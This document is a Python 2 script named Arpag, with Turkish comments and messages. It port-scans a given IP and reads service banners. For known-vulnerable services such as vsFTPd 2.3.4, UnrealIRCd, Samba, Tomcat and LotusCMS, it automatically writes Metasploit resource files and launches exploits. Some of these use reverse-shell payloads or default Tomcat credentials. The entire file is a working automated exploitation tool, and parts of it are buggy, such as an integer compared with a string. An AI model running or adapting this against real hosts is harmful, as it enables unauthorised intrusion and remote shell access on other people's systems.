# -*- coding: utf-8 -*-
__author__="Anil Baran Yelken"
#"arpağ:Türk mitolojisinde büyülü söz anlamındadır.Exploit etme işlemini otomatik yaptığı için araç adı arpağ seçilmiştir."
import argparse
import socket
import subprocess
import requests
desc="Arpag - Automatic Vulnerability Exploiter"
parser=argparse.ArgumentParser(description=desc)
parser.add_argument("IP_address",help="IP address")
parser.add_argument("Exploit_status",help="Exploit status")
parser.add_argument("Port_baslangic",help="Port initial number")
parser.add_argument("Port_bitis",help="Port end number")
args = parser.parse_args()
if args:
    IP = getattr(args, 'IP_address')
    try:
        automaticExploit=getattr(args,'Exploit_status')
    except:
        automaticExploit = False
    try:
        baslangic=int(getattr(args,'Port_baslangic'))
    except:
        baslangic = 1
    try:
        bitis=int(getattr(args,'Port_bitis'))
    except:
        bitis = 1024
bannerListe=[]
portListe=[]
for port in range(baslangic,bitis):
    try:
        sock = socket.socket()
        sock.connect((IP,port))
        banner=str(sock.recv(1024)).splitlines()[0]
        portListe.append(port)
        print "[+]Port: ",port
        print "[+]Servis: :",banner
        bannerListe.append(banner)
        sock.close()
    except:
        pass
path=subprocess.check_output("pwd",shell=True)
print "\n[+]Exploit kontrolleri başlıyor...\n"
for i in bannerListe:
    if "vsFTPd 2.3.4" in i:
        print "[+]Serviste exploit kontrolü başlıyor: ",i
        print "[+]Metasploit exploit: exploit/unix/ftp/vsftpd_234_backdoor"
        if automaticExploit  == "True":
            try:
                rc="""use exploit/unix/ftp/vsftpd_234_backdoor
          set RHOST rhost
          set RPORT 21
          exploit"""
                rc=rc.replace("rhost",str(IP))
                path=subprocess.check_output("pwd",shell=True).splitlines()[0]
                path=path+"/vsFTPd2-3-4.rc"
                dosya=open(path,"w")
                dosya.write(rc)
                dosya.close()
                komut="xterm -e msfconsole -r "+str(path)
                subprocess.Popen(komut,shell=True,stdout=subprocess.PIPE)
            except:
                print "Exploit edilemedi"
    elif "UnrealIRCd" in i:
        print "[+]Serviste exploit kontrolü başlıyor: ",i
        print "[+]Metasploit exploit: exploit/unix/irc/unreal_ircd_3281_backdoor"
        if automaticExploit == "True":
            try:
                rc="""use exploit/unix/irc/unreal_ircd_3281_backdoor
          set RHOST rhost
          set RPORT 6667
          exploit"""
                rc=rc.replace("rhost",str(IP))
                path=subprocess.check_output("pwd",shell=True).splitlines()[0]
                path=path+"/unreal_ircd_3281_backdoor.rc"
                dosya=open(path,"w")
                dosya.write(rc)
                dosya.close()
                komut="xterm -e msfconsole -r "+str(path)
                subprocess.Popen(komut,shell=True,stdout=subprocess.PIPE)
            except:
                print "Exploit edilemedi"
    elif "GNU Classpath grmiregistry" in i:
        print "[+]Serviste exploit kontrolü başlıyor: ",i
        print "[+]Metasploit exploit: exploit/multi/misc/java_rmi_server"
        if automaticExploit == "True":
            try:
                rc="""use exploit/multi/misc/java_rmi_server
          set RHOST rhost
          set RPORT 1099
          exploit"""
                rc=rc.replace("rhost",str(IP))
                path=subprocess.check_output("pwd",shell=True).splitlines()[0]
                path=path+"/java_rmi_server.rc"
                dosya=open(path,"w")
                dosya.write(rc)
                dosya.close()
                komut="xterm -e msfconsole -r "+str(path)
                subprocess.Popen(komut,shell=True,stdout=subprocess.PIPE)
            except:
                print "Exploit edilemedi"
    elif "rsh" in i:
        print "[+]Serviste exploit kontrolü başlıyor: ",i
        print "[+]Metasploit exploit: rsh connection"
        if automaticExploit == "True":
            try:
                komut="xterm -e rsh "+str(IP)+" id"
                sonuc = subprocess.Popen(komut,shell=True,stdout=subprocess.PIPE)
                print "[+]rsh login başarılı: ",sonuc
            except:
                print "Exploit edilemedi"
    elif "Samba 3.0.20" in i:
        print "[+]Serviste exploit kontrolü başlıyor: ",i
        print "[+]Metasploit exploit: exploit/multi/samba/usermap_script"
        if automaticExploit == "True":
            try:
                rc="""use exploit/multi/samba/usermap_script
          set RHOST rhost
          set RPORT 445
          exploit"""
                rc=rc.replace("rhost",str(IP))
                path=subprocess.check_output("pwd",shell=True).splitlines()[0]
                path=path+"/samba_usermap_script.rc"
                dosya=open(path,"w")
                dosya.write(rc)
                dosya.close()
                komut="xterm -e msfconsole -r "+str(path)
                subprocess.Popen(komut,shell=True,stdout=subprocess.PIPE)
            except:
                print "Exploit edilemedi"
    elif "Apache Tomcat" in i:
        print "[+]Serviste exploit kontrolü başlıyor: ",i
        print "[+]Metasploit exploit: exploit/multi/http/tomcat_mgr_deploy"
        if automaticExploit == "True":
            try:
                rc="""use exploit/multi/http/tomcat_mgr_deploy
          use payload/java/meterpreter/reverse_tcp
          set RHOST rhost
          set RPORT 8180
          set target 0
          set httpusername tomcat
          set httppassword tomcat
          exploit"""
                rc=rc.replace("rhost",str(IP))
                path=subprocess.check_output("pwd",shell=True).splitlines()[0]
                path=path+"/tomcat_mgr_deploy.rc"
                dosya=open(path,"w")
                dosya.write(rc)
                dosya.close()
                komut="xterm -e msfconsole -r "+str(path)
                subprocess.Popen(komut,shell=True,stdout=subprocess.PIPE)
            except:
                print "Exploit edilemedi"
    elif "Apache httpd" in i:
        indexListe=bannerListe.index("httpd")
        print "[+]Apache servisinde bulunan anasayfaya istek yapılıyor"
        if int(portListe[indexListe])=="8383":
            url="https://"+str(IP)+":8383"
            sonuc=requests.get(url,verify=False)
            if "ManageEngine"  in sonuc.content:
                if automaticExploit == "True":
                    try:
                        rc="""use exploit/windows/http/manageengine_connectionid_write
                  set SSL true
                  set RHOST rhost
                  set RPORT 8383
                  exploit"""
                        rc=rc.replace("rhost",str(IP))
                        path=subprocess.check_output("pwd",shell=True).splitlines()[0]
                        path=path+"/manageengine_connectionid_write.rc"
                        dosya=open(path,"w")
                        dosya.write(rc)
                        dosya.close()
                        komut="xterm -e msfconsole -r "+str(path)
                        subprocess.Popen(komut,shell=True,stdout=subprocess.PIPE)
                    except:
                        print "Exploit edilemedi"
    elif "Samba" in i:
        print "[+]Serviste exploit kontrolü başlıyor: ",i
        print "[+]Metasploit exploit: exploit/linux/samba/trans2open"
        if automaticExploit == "True":
            try:
                rc="""use exploit/linux/samba/trans2open
          set RHOST rhost
          set RPORT 139
          exploit"""
                rc=rc.replace("rhost",str(IP))
                path=subprocess.check_output("pwd",shell=True).splitlines()[0]
                path=path+"/trans2open_samba.rc"
                dosya=open(path,"w")
                dosya.write(rc)
                dosya.close()
                komut="xterm -e msfconsole -r "+str(path)
                subprocess.Popen(komut,shell=True,stdout=subprocess.PIPE)
            except:
                print "Exploit edilemedi"
    elif "LotusCMS" in i:
        print "[+]Serviste exploit kontrolü başlıyor: ",i
        print "[+]Metasploit exploit: exploit/multi/http/lcms_php_exec"
        if automaticExploit == "True":
            try:
                rc="""use exploit/multi/http/lcms_php_exec
          set RHOST rhost
          set RPORT 80
          set payload generic/shell_reverse_tcp
          set URI /
          exploit"""
                rc=rc.replace("rhost",str(IP))
                path=subprocess.check_output("pwd",shell=True).splitlines()[0]
                path=path+"/lcms_php_exec.rc"
                dosya=open(path,"w")
                dosya.write(rc)
                dosya.close()
                komut="xterm -e msfconsole -r "+str(path)
                subprocess.Popen(komut,shell=True,stdout=subprocess.PIPE)
            except:
                print "Exploit edilemedi"
    else:
        continue
